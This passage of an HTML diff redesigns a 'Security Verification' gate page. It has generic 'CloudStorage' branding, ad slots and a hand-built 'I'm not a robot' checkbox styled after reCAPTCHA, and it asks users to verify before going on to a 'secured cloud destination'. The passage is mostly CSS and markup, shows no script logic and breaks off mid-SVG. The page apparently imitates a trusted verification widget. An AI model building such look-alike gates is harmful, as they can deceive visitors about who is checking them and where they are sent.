@@ -1,647 +1,1051 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Security Verification</title>
-    <style>
-        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-        
-        body{
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            font-family:'Inter',system-ui,-apple-system,sans-serif;
-            min-height:100vh;
-            overflow:hidden;
-            background:linear-gradient(135deg, #e5f0f9 0%, #f0f0f0 50%, #e8e8f0 100%);
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Security Verification</title>
+  <meta name="description" content="Complete the security check to continue" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <script src="https://www.google.com/recaptcha/enterprise.js?render=6LdpjT0tAAAAAP2zkDLN41nuzPMmced0cXvq3EGj"></script>
+  
+  <style>
+    :root {
+      --radius-sm: 8px;
+      --radius: 12px;
+      --radius-lg: 18px;
+      --radius-xl: 24px;
+      
+      /* Requested Palette: #d7373f, #1473e6, #4b4b4b, #FFFFFF */
+      --color-red: #d7373f;
+      --color-red-hover: #b82b32;
+      --color-red-light: rgba(215, 55, 63, 0.08);
+      
+      --color-blue: #1473e6;
+      --color-blue-hover: #0d5bbd;
+      --color-blue-light: rgba(20, 115, 230, 0.08);
+      
+      --color-text-main: #111827;
+      --color-text-muted: #4b4b4b;
+      --color-text-subtle: #6b7280;
+      
+      --canvas: #ffffff;
+      --canvas-subtle: #f8fafc;
+      --surface: #ffffff;
+      --surface-elevated: #ffffff;
+      
+      --border-light: #e2e8f0;
+      --border-medium: #cbd5e1;
+      --border-active: #1473e6;
+      
+      --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
+      --shadow-md: 0 10px 25px -5px rgba(0, 0, 0, 0.06), 0 8px 10px -6px rgba(0, 0, 0, 0.04);
+      --shadow-elevated: 0 20px 40px -12px rgba(20, 115, 230, 0.08), 0 10px 20px -5px rgba(0, 0, 0, 0.04);
+      --shadow-card: 0 12px 32px rgba(15, 23, 42, 0.08);
+      
+      --font-sans: 'Plus Jakarta Sans', 'Inter', system-ui, -apple-system, sans-serif;
+    }
 
-        canvas{
-            position:fixed;
-            top:0;
-            left:0;
-            z-index:1;
-        }
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-        .container{
-            position:relative;
-            z-index:10;
-            width:100%;
-            max-width:500px;
-            margin:24px;
-            padding:0;
-        }
+    #bg-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
 
-        .card{
-            background:rgba(255,255,255,0.85);
-            -webkit-backdrop-filter:blur(10px);
-            backdrop-filter:blur(10px);
-            border-radius:24px;
-            border:1px solid rgba(0,120,212,0.2);
-            overflow:hidden;
-            box-shadow:0 20px 60px rgba(0,120,212,0.15), 0 0 40px rgba(0,120,212,0.08);
-            transition:all 0.4s cubic-bezier(0.23,1,0.320,1);
-        }
+    body {
+      font-family: var(--font-sans);
+      background-color: var(--canvas-subtle);
+      color: var(--color-text-main);
+      line-height: 1.5;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
 
-        .card:hover{
-            box-shadow:0 30px 80px rgba(0,120,212,0.25), 0 0 60px rgba(0,120,212,0.12);
-            transform:translateY(-4px);
-        }
+    .grid-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      pointer-events: none;
+      opacity: 0.6;
+      background-image: 
+        radial-gradient(var(--border-medium) 1px, transparent 1px);
+      background-size: 28px 28px;
+    }
 
-        .card-content{
-            padding:48px 40px;
-        }
+    .cursor-glow {
+      position: fixed;
+      width: 450px;
+      height: 450px;
+      margin-left: -225px;
+      margin-top: -225px;
+      background: radial-gradient(circle, rgba(20, 115, 230, 0.06) 0%, rgba(215, 55, 63, 0.04) 45%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 1;
+      transition: transform 0.12s ease-out;
+    }
 
-        .background-glow{
-            position:absolute;
-            border-radius:50%;
-            opacity:0.6;
-            filter:blur(40px);
-            animation:float 6s ease-in-out infinite;
-        }
+    .site-header {
+      position: sticky;
+      top: 0;
+      z-index: 30;
+      background: rgba(255, 255, 255, 0.88);
+      border-bottom: 1px solid var(--border-light);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      box-shadow: var(--shadow-sm);
+    }
 
-        .glow-1{
-            width:200px;
-            height:200px;
-            background:radial-gradient(circle, rgba(0,120,212,0.4) 0%, transparent 70%);
-            top:-50px;
-            right:-50px;
-        }
+    .header-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 1.5rem;
+      height: 4.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
 
-        .glow-2{
-            width:150px;
-            height:150px;
-            background:radial-gradient(circle, rgba(0,120,212,0.3) 0%, transparent 70%);
-            bottom:-30px;
-            left:-30px;
-            animation:float 8s ease-in-out infinite reverse;
-        }
+    .header-left-group {
+      display: flex;
+      align-items: center;
+      gap: 1.25rem;
+    }
 
-        @keyframes float{
-            0%,100%{transform:translateY(0px)}
-            50%{transform:translateY(20px)}
-        }
+    .logo-badge {
+      width: 38px;
+      height: 38px;
+      background: linear-gradient(135deg, var(--color-red) 0%, #b82b32 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: var(--radius-sm);
+      box-shadow: 0 4px 12px rgba(215, 55, 63, 0.25);
+    }
 
-        .header{
-            display:flex;
-            flex-direction:column;
-            align-items:center;
-            text-align:center;
-            margin-bottom:36px;
-            position:relative;
-            z-index:2;
-        }
+    .logo-text {
+      color: #ffffff;
+      font-weight: 800;
+      font-size: 15px;
+      letter-spacing: -0.03em;
+    }
 
-        .icon-container{
-            position:relative;
-            margin-bottom:24px;
-        }
+    .brand-text {
+      font-weight: 700;
+      font-size: 1.15rem;
+      letter-spacing: -0.02em;
+      color: var(--color-text-main);
+    }
 
-        .icon-box{
-            width:72px;
-            height:72px;
-            background:linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
-            border-radius:20px;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            color:white;
-            flex-shrink:0;
-            box-shadow:0 12px 32px rgba(0,120,212,0.35);
-            animation:pulse-glow 2s ease-in-out infinite;
-            position:relative;
-            overflow:hidden;
-        }
+    .brand-accent {
+      color: var(--color-red);
+    }
 
-        .icon-box::before{
-            content:'';
-            position:absolute;
-            inset:0;
-            background:linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.2) 50%, transparent 70%);
-            animation:shimmer 3s infinite;
-        }
+    .header-nav {
+      display: flex;
+      gap: 1.75rem;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--color-text-muted);
+      margin-left: 2rem;
+    }
 
-        .icon-box svg{
-            width:36px;
-            height:36px;
-            position:relative;
-            z-index:1;
-        }
+    .header-nav a {
+      color: inherit;
+      text-decoration: none;
+      transition: color 0.2s;
+    }
 
-        @keyframes pulse-glow{
-            0%,100%{box-shadow:0 12px 32px rgba(0,120,212,0.35)}
-            50%{box-shadow:0 12px 48px rgba(0,120,212,0.5)}
-        }
+    .header-nav a:hover {
+      color: var(--color-blue);
+    }
 
-        @keyframes shimmer{
-            0%{transform:translateX(-100%)}
-            100%{transform:translateX(100%)}
-        }
+    .btn {
+      border: none;
+      cursor: pointer;
+      font-family: var(--font-sans);
+      font-size: 0.875rem;
+      font-weight: 600;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0.625rem 1.25rem;
+      border-radius: var(--radius-sm);
+      outline: none;
+    }
 
-        .title{
-            font-size:28px;
-            font-weight:700;
-            background:linear-gradient(135deg, #0078d4 0%, #106ebe 50%, #005a9e 100%);
-            -webkit-background-clip:text;
-            -webkit-text-fill-color:transparent;
-            background-clip:text;
-            letter-spacing:-0.03em;
-            line-height:1.2;
-            margin-bottom:8px;
-        }
+    .btn-primary {
+      background: var(--color-red);
+      color: #ffffff;
+      box-shadow: 0 4px 12px rgba(215, 55, 63, 0.25);
+    }
 
-        .subtitle{
-            font-size:15px;
-            color:#666;
-            line-height:1.6;
-            font-weight:500;
-        }
+    .btn-primary:hover {
+      background: var(--color-red-hover);
+      box-shadow: 0 6px 16px rgba(215, 55, 63, 0.35);
+      transform: translateY(-1px);
+    }
 
-        .verify-button{
-            position:relative;
-            display:flex;
-            align-items:center;
-            gap:16px;
-            width:100%;
-            padding:16px 20px;
-            background:linear-gradient(135deg, rgba(0,120,212,0.08) 0%, rgba(0,120,212,0.05) 100%);
-            border:2px solid rgba(0,120,212,0.3);
-            border-radius:16px;
-            cursor:pointer;
-            transition:all 0.3s cubic-bezier(0.23,1,0.320,1);
-            overflow:hidden;
-            font-size:15px;
-            font-weight:600;
-            color:#333;
-            z-index:2;
-        }
+    .btn-ghost {
+      background: transparent;
+      color: var(--color-text-muted);
+      border: 1px solid var(--border-medium);
+      margin-right: 0.5rem;
+    }
 
-        .verify-button::before{
-            content:'';
-            position:absolute;
-            inset:0;
-            background:linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
-            opacity:0;
-            animation:slide 0.5s ease;
-        }
+    .btn-ghost:hover {
+      color: var(--color-text-main);
+      border-color: var(--color-blue);
+      background: var(--color-blue-light);
+    }
 
-        .verify-button:hover:not(.verified):not(.loading){
-            background:linear-gradient(135deg, rgba(0,120,212,0.15) 0%, rgba(0,120,212,0.12) 100%);
-            border-color:rgba(0,120,212,0.5);
-            box-shadow:0 8px 24px rgba(0,120,212,0.2);
-            transform:translateY(-2px);
-        }
+    .page-layout {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2.5rem 1.5rem;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 2.5rem;
+      position: relative;
+      z-index: 10;
+      flex: 1;
+    }
 
-        .verify-button:active:not(.verified):not(.loading){
-            transform:translateY(0);
-        }
+    @media (min-width: 1024px) {
+      .page-layout {
+        grid-template-columns: 1fr 340px;
+      }
+    }
 
-        .verify-button.loading{
-            opacity:0.7;
-            cursor:not-allowed;
-        }
+    .main-content {
+      display: flex;
+      flex-direction: column;
+      gap: 2rem;
+    }
 
-        .verify-button.verified{
-            background:linear-gradient(135deg, rgba(34,197,94,0.1) 0%, rgba(34,197,94,0.08) 100%);
-            border-color:rgba(34,197,94,0.4);
-        }
+    .security-card {
+      border-radius: var(--radius-xl);
+      overflow: hidden;
+      box-shadow: var(--shadow-card);
+      background: var(--surface);
+      border: 1px solid var(--border-light);
+      position: relative;
+    }
 
-        @keyframes slide{
-            0%{transform:translateX(-100%)}
-            100%{transform:translateX(100%)}
-        }
+    .security-header {
+      position: relative;
+      padding: 3rem 2rem 2rem;
+      background: linear-gradient(180deg, #f8fafc 0%, #ffffff 100%);
+      text-align: center;
+      border-bottom: 1px solid var(--border-light);
+    }
 
-        .checkbox{
-            position:relative;
-            width:36px;
-            height:36px;
-            border:2px solid #0078d4;
-            border-radius:10px;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            background:linear-gradient(135deg, rgba(0,120,212,0.1) 0%, rgba(0,120,212,0.08) 100%);
-            flex-shrink:0;
-            transition:all 0.3s ease;
-        }
+    .security-header-inner {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.85rem;
+      position: relative;
+      z-index: 2;
+    }
 
-        .checkbox svg{
-            width:20px;
-            height:20px;
-            color:white;
-            opacity:0;
-            transition:opacity 0.3s ease;
-            stroke-width:3;
-        }
+    /* Multi-Layered Visual Security Check Badge */
+    .security-badge-wrapper {
+      position: relative;
+      width: 110px;
+      height: 110px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 0.5rem;
+    }
 
-        .verify-button:hover:not(.verified):not(.loading) .checkbox{
-            border-color:#106ebe;
-            background:linear-gradient(135deg, rgba(0,120,212,0.15) 0%, rgba(0,120,212,0.1) 100%);
-            box-shadow:0 0 16px rgba(0,120,212,0.3);
-        }
+    /* Outer rotating scanner ring */
+    .badge-ring-outer {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 2px dashed rgba(20, 115, 230, 0.35);
+      animation: rotateRing 18s linear infinite;
+    }
 
-        .verify-button.verified .checkbox{
-            border-color:#22c55e;
-            background:#22c55e;
-        }
+    .badge-ring-pulse {
+      position: absolute;
+      inset: 6px;
+      border-radius: 50%;
+      background: rgba(20, 115, 230, 0.05);
+      border: 1px solid rgba(20, 115, 230, 0.15);
+      animation: pulseGlow 3s ease-in-out infinite alternate;
+    }
 
-        .verify-button.verified .checkbox svg{
-            opacity:1;
-        }
+    /* Center Badge Icon Box */
+    .security-badge-icon {
+      width: 76px;
+      height: 76px;
+      border-radius: 22px;
+      background: #ffffff;
+      box-shadow: 0 12px 28px rgba(20, 115, 230, 0.15), inset 0 0 0 1px rgba(20, 115, 230, 0.12);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      z-index: 2;
+      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
 
-        .button-text{
-            flex:1;
-            text-align:left;
-        }
+    .security-badge-icon.done {
+      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+      box-shadow: 0 12px 28px rgba(16, 185, 129, 0.3);
+      transform: scale(1.05);
+    }
 
-        .button-title{
-            font-size:16px;
-            font-weight:700;
-            color:#222;
-            display:block;
-        }
+    .security-badge-icon.done .badge-ring-outer {
+      border-color: rgba(16, 185, 129, 0.4);
+    }
 
-        .button-subtitle{
-            font-size:12px;
-            color:#999;
-            display:block;
-            margin-top:4px;
-            font-weight:500;
-        }
+    /* Live Protection Tag */
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      padding: 0.25rem 0.75rem;
+      background: rgba(20, 115, 230, 0.08);
+      border: 1px solid rgba(20, 115, 230, 0.2);
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: var(--color-blue);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
 
-        .verify-button.verified .button-title,
-        .verify-button.verified .button-subtitle{
-            color:#22c55e;
-        }
+    .status-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--color-blue);
+      box-shadow: 0 0 8px var(--color-blue);
+      animation: blinkDot 1.8s ease-in-out infinite;
+    }
 
-        .arrow{
-            color:#0078d4;
-            transition:all 0.3s cubic-bezier(0.23,1,0.320,1);
-            flex-shrink:0;
-            width:20px;
-            height:20px;
-        }
+    .security-header h1 {
+      font-size: 1.85rem;
+      font-weight: 800;
+      color: var(--color-text-main);
+      letter-spacing: -0.02em;
+    }
 
-        .verify-button:hover:not(.verified):not(.loading) .arrow{
-            color:#106ebe;
-            transform:translateX(6px);
-        }
+    .security-header p {
+      font-size: 0.95rem;
+      color: var(--color-text-muted);
+      font-weight: 500;
+      max-width: 420px;
+    }
 
-        .footer{
-            display:flex;
-            align-items:center;
-            justify-content:space-between;
-            margin-top:28px;
-            padding-top:20px;
-            border-top:1px solid rgba(0,120,212,0.15);
-            position:relative;
-            z-index:2;
-        }
+    /* Keyframe Animations for Badge */
+    @keyframes rotateRing {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
 
-        .encrypted{
-            display:flex;
-            align-items:center;
-            gap:8px;
-            font-size:11px;
-            color:#0078d4;
-            font-weight:700;
-            text-transform:uppercase;
-            letter-spacing:0.1em;
-        }
+    @keyframes pulseGlow {
+      0% { transform: scale(0.96); opacity: 0.6; }
+      100% { transform: scale(1.04); opacity: 1; }
+    }
 
-        .dot{
-            width:6px;
-            height:6px;
-            background:linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
-            border-radius:50%;
-            box-shadow:0 0 8px rgba(0,120,212,0.6);
-            animation:blink 2s ease-in-out infinite;
-        }
+    @keyframes blinkDot {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
 
-        .shield-text{
-            font-size:11px;
-            color:#999;
-            font-weight:600;
-            letter-spacing:0.05em;
-        }
+    .security-card-body-content {
+      padding: 2.5rem 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-        @keyframes blink{
-            0%,100%{opacity:1;box-shadow:0 0 8px rgba(0,120,212,0.6)}
-            50%{opacity:0.4;box-shadow:0 0 4px rgba(0,120,212,0.3)}
-        }
+    .captcha-box {
+      width: 100%;
+      max-width: 360px;
+      margin: 0.5rem auto 0;
+      background: #ffffff;
+      border: 1px solid var(--border-medium);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-md);
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      overflow: hidden;
+    }
 
-        @keyframes spin{
-            to{transform:rotate(360deg)}
-        }
-        
-        .spinner{
-            display:inline-block;
-            width:16px;
-            height:16px;
-            border:2px solid rgba(0,120,212,0.3);
-            border-top-color:#0078d4;
-            border-radius:50%;
-            animation:spin 0.8s linear infinite;
-            margin-right:8px;
-        }
+    .captcha-box:hover {
+      border-color: var(--color-blue);
+      box-shadow: 0 12px 30px rgba(20, 115, 230, 0.12);
+    }
 
-        .status-text{
-            font-size:14px;
-            color:#666;
-            transition:color 0.3s ease;
-            font-weight:500;
-        }
+    .captcha-inner {
+      display: flex;
+      align-items: center;
+      padding: 1.1rem 1.25rem;
+      justify-content: space-between;
+    }
 
-        .error{
-            color:#ff6b6b;
-            font-size:13px;
-            margin-top:16px;
-            text-align:center;
-            display:none;
-            animation:slideDown 0.3s ease;
-            background:rgba(255,107,107,0.08);
-            padding:12px;
-            border-radius:10px;
-            border-left:3px solid #ff6b6b;
-            font-weight:500;
-        }
+    .captcha-checkbox-container {
+      display: flex;
+      align-items: center;
+      gap: 0.85rem;
+    }
 
-        @keyframes slideDown{
-            from{opacity:0;transform:translateY(-10px)}
-            to{opacity:1;transform:translateY(0)}
-        }
+    .captcha-checkbox {
+      width: 2.1rem;
+      height: 2.1rem;
+      flex-shrink: 0;
+      background: #f8fafc;
+      border: 2px solid var(--border-medium);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
 
-        @media (max-width: 600px){
-            .card-content{
-                padding:32px 24px;
-            }
-            .title{
-                font-size:24px;
-            }
-            .verify-button{
-                padding:14px 16px;
-                gap:12px;
-            }
-            .icon-box{
-                width:60px;
-                height:60px;
-            }
-            .icon-box svg{
-                width:30px;
-                height:30px;
-            }
-        }
-    </style>
+    .captcha-checkbox:hover {
+      border-color: var(--color-blue);
+      background: var(--color-blue-light);
+      transform: scale(1.04);
+    }
+
+    .captcha-label {
+      font-size: 0.95rem;
+      color: var(--color-text-main);
+      user-select: none;
+      font-weight: 600;
+    }
+
+    .captcha-badge {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.2rem;
+    }
+
+    .captcha-badge-icon {
+      width: 2rem;
+      height: 2rem;
+      background: linear-gradient(135deg, var(--color-blue) 0%, var(--color-red) 100%);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 8px rgba(20, 115, 230, 0.2);
+    }
+
+    .captcha-terms {
+      font-size: 8px;
+      color: var(--color-text-subtle);
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .recaptcha-text {
+      font-weight: 800;
+      font-size: 8.5px;
+      color: var(--color-blue);
+      letter-spacing: 0.06em;
+      margin-top: 1px;
+    }
+
+    .captcha-spinner {
+      width: 1.25rem;
+      height: 1.25rem;
+      border: 2.5px solid var(--color-blue);
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+    }
+
+    .ad-card {
+      position: relative;
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      border: 1px solid var(--border-light);
+      box-shadow: var(--shadow-sm);
+      background: #ffffff;
+      transition: all 0.3s ease;
+    }
+
+    .ad-card:hover {
+      border-color: var(--border-medium);
+      box-shadow: var(--shadow-md);
+      transform: translateY(-2px);
+    }
+
+    .ad-card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(0, 0, 0, 0.05) 0%, rgba(0, 0, 0, 0.8) 100%);
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    .ad-label {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      font-size: 9px;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(8px);
+      color: var(--color-red);
+      font-weight: 800;
+      padding: 4px 10px;
+      border-radius: 6px;
+      z-index: 10;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .ad-overlay-content {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      padding: 1.25rem;
+      z-index: 5;
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+      color: #ffffff;
+    }
+
+    .ad-tag {
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      color: #93c5fd;
+      font-weight: 700;
+    }
+
+    .ad-title {
+      font-weight: 700;
+      font-size: 0.98rem;
+      line-height: 1.35;
+      color: #ffffff;
+      text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
+    }
+
+    .ad-cta {
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: #ffffff;
+      margin-top: 0.35rem;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      transition: transform 0.2s;
+    }
+
+    .ad-cta:hover {
+      transform: translateX(4px);
+      color: #60a5fa;
+    }
+
+    .size-leaderboard { height: 120px; }
+    .size-billboard { height: 220px; }
+    .size-mrec { height: 260px; }
+    .size-halfpage { height: 480px; }
+
+    .sidebar {
+      display: flex;
+      flex-direction: column;
+      gap: 2rem;
+    }
+
+    .ad-card-video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .checkbox-success {
+      border-color: #10b981 !important;
+      background: rgba(16, 185, 129, 0.15) !important;
+    }
+
+    .checkbox-error {
+      border-color: var(--color-red) !important;
+      background: var(--color-red-light) !important;
+    }
+
+    .title-success {
+      color: #059669 !important;
+    }
+
+    .is-hidden {
+      display: none !important;
+    }
+
+    .captcha-footer-note {
+      font-size: 0.825rem;
+      color: var(--color-text-subtle);
+      text-align: center;
+      margin-top: 1.75rem;
+      max-width: 380px;
+      line-height: 1.5;
+    }
+
+    .text-link-brand {
+      color: var(--color-blue);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .text-link-brand:hover {
+      text-decoration: underline;
+    }
+
+    .site-footer {
+      border-top: 1px solid var(--border-light);
+      background: #ffffff;
+      margin-top: auto;
+      position: relative;
+      z-index: 10;
+    }
+
+    .footer-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 1.75rem 1.5rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+      justify-content: space-between;
+      font-size: 0.85rem;
+      color: var(--color-text-muted);
+      font-weight: 500;
+    }
+
+    .footer-inner a {
+      color: var(--color-text-muted);
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+
+    .footer-inner a:hover {
+      color: var(--color-blue);
+    }
+
+    .footer-link-group {
+      display: flex;
+      gap: 1.75rem;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes check-pop {
+      0% { transform: scale(0.4); opacity: 0; }
+      70% { transform: scale(1.15); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .animate-check-pop {
+      animation: check-pop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+    }
+
+    @media (max-width: 768px) {
+      .hidden-mobile {
+        display: none !important;
+      }
+    }
+  </style>
 </head>
+
 <body>
-    <canvas id="canvas"></canvas>
-    
-    <div class="container">
-        <div class="card">
-            <div class="background-glow glow-1"></div>
-            <div class="background-glow glow-2"></div>
-            
-            <div class="card-content">
-                <div class="header">
-                    <div class="icon-container">
-                        <div class="icon-box">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-                        </div>
-                    </div>
-                    <div class="title">Security Verification</div>
-                    <div class="subtitle status-text" id="status-text">Click the button below to verify your identity.</div>
-                </div>
+  <canvas id="bg-canvas"></canvas>
+  <div class="grid-overlay"></div>
+  <div class="cursor-glow" id="cursor-glow"></div>
 
-                <div class="verify-button" id="verify-btn">
-                    <div class="checkbox">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
-                    </div>
-                    <div class="button-text">
-                        <span class="button-title" id="btn-text">Click to Verify</span>
-                        <span class="button-subtitle">Verify your browser identity</span>
-                    </div>
-                    <svg class="arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
-                </div>
-
-                <div class="footer">
-                    <div class="encrypted"><span class="dot"></span>Encrypted</div>
-                    <div class="shield-text">Protected by Shield</div>
-                </div>
-
-                <div class="error" id="error-msg"></div>
-            </div>
-        </div>
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="header-left-group">
+        <div class="logo-badge"><span class="logo-text">CS</span></div>
+        <span class="brand-text">Cloud<span class="brand-accent">Storage</span></span>
+        <nav class="header-nav hidden-mobile">
+          <a href="#">Products</a>
+          <a href="#">Solutions</a>
+          <a href="#">Pricing</a>
+          <a href="#">Docs</a>
+        </nav>
+      </div>
+      <div>
+        <a href="#" class="btn btn-ghost hidden-mobile">Sign In</a>
+        <button class="btn btn-primary">Get Started</button>
+      </div>
     </div>
+  </header>
 
-    <script>
-        // Animated background canvas
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+  <div class="page-layout">
+    <main class="main-content">
+      <div id="ad-leaderboard"></div>
+      
+      <section class="security-card">
+        <div class="security-header">
+          <div class="security-header-inner">
+            <div class="status-pill">
+              <span class="status-dot"></span>
+              SSL 256-Bit Encrypted Gateway
+            </div>
 
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
+            <!-- Enhanced Multi-Layer Security Visual -->
+            <div class="security-badge-wrapper">
+              <div class="badge-ring-outer"></div>
+              <div class="badge-ring-pulse"></div>
+              <div id="verified-icon" class="security-badge-icon">
+                <!-- Multi-Layer Vector Shield & Lock Icon -->
+                <svg id="shield-icon" viewBox="0 0 48 48" width="44" height="44" fill="none">
+                  <!-- Outer Shield Base -->
+                  <path d="M24 6L38 11V22C38 31.5 32 39.5 24 42C16 39.5 10 31.5 10 22V11L24 6Z" fill="#d7373f" fill-opacity="0.08" stroke="#d7373f" stroke-width="2.5" stroke-linejoin="round"/>
+                  <!-- Inner Shield Tech Accent Line -->
+                  <path d="M24 10V38" stroke="#1473e6" stroke-width="2" stroke-linecap="round" stroke-dasharray="3 3"/>
+                  <!-- Center Keyhole Padlock -->
+                  <rect x="18" y="22" width="12" height="10" rx="2" fill="#d7373f"/>
+                  <path d="M21 22V18C21 16.3431 22.3431 15 24 15C25.6569 15 27 16.3431 27 18V22" stroke="#1473e6" stroke-width="2.5" stroke-linecap="round"/>
+                  <circle cx="24" cy="26" r="1.5" fill="#ffffff"/>
+                </svg>
+                
+                <!-- Success Checkmark SVG -->
+                <svg id="check-icon" viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="is-hidden">
+                  <polyline points="20 6 9 17 4 12"/>
+                </svg>
+              </div>
+            </div>
 
-        const particles = [];
-        const shapes = [];
+            <h1 id="security-title">Security Check</h1>
+            <p id="security-desc">Please complete a quick verification check to proceed to secured cloud destination.</p>
+          </div>
+        </div>
 
-        class Particle {
-            constructor() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.vx = (Math.random() - 0.5) * 0.4;
-                this.vy = (Math.random() - 0.5) * 0.4;
-                this.radius = Math.random() * 1.2;
-                this.opacity = Math.random() * 0.25 + 0.05;
-                this.color = ['#0078d4', '#106ebe', '#005a9e'][Math.floor(Math.random() * 3)];
-            }
+        <div class="security-card-body-content">
+          <div id="captcha-wrapper">
+            <div class="captcha-box">
+              <div class="captcha-inner">
+                <div class="captcha-checkbox-container">
+                  <div id="captcha-checkbox" class="captcha-checkbox" role="checkbox" aria-checked="false" aria-label="I'm not a robot" tabindex="0">
+                    <div id="captcha-spinner" class="captcha-spinner is-hidden"></div>
+                    <svg id="captcha-check" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#d7373f" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round" class="is-hidden">
+                      <polyline points="20 6 9 17 4 12" />
+                    </svg>
+                  </div>
+                  <span class="captcha-label">I'm not a robot</span>
+                </div>
+                <div class="captcha-badge">
+                  <div class="captcha-badge-icon">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="white">
